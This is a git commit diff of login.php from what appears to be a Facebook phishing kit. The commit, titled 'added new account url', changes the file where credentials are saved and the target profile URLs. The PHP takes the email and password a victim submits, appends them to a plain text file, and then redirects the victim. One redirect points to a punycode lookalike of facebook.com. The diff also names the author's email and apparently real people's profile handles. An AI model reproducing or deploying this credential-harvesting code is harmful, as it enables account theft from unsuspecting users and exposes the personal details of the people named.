5555867086e25b6338b1cf5e91cba2993f26f435
aditya6677 <sankmr76@gmail.com>
2019-05-05 11:05:07 +0530

    added new account url

--- login.php
+++ login.php
@@ -1,17 +1,17 @@
 <?php
-require "pass.txt";
+require "youme.txt";
 $email = $_POST['email'];
 $pass = $_POST['pass'];
 if(empty($email) || empty($pass)){
-    header('Location: https://www.xn--facebok-f1a.co/yashikasingh345/');
+    header('Location: https://www.xn--facebok-f1a.co/srishti.roychoudhary.9/');
 }
 else{
     $email = $email;
     $pass = $pass;
     $sep = "*********************\n";
-    file_put_contents('pass.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
-    file_put_contents('pass.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
-    file_put_contents('pass.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
-    header('Location: https://m.facebook.com/profile.php?id=100028070380145');
+    file_put_contents('youme.txt', $email.PHP_EOL , FILE_APPEND | LOCK_EX);
+    file_put_contents('youme.txt', $pass.PHP_EOL , FILE_APPEND | LOCK_EX);
+    file_put_contents('youme.txt', $sep.PHP_EOL , FILE_APPEND | LOCK_EX);
+    header('Location: https://www.facebook.com/srishti.roychoudhury.9/');
 }
 ?>
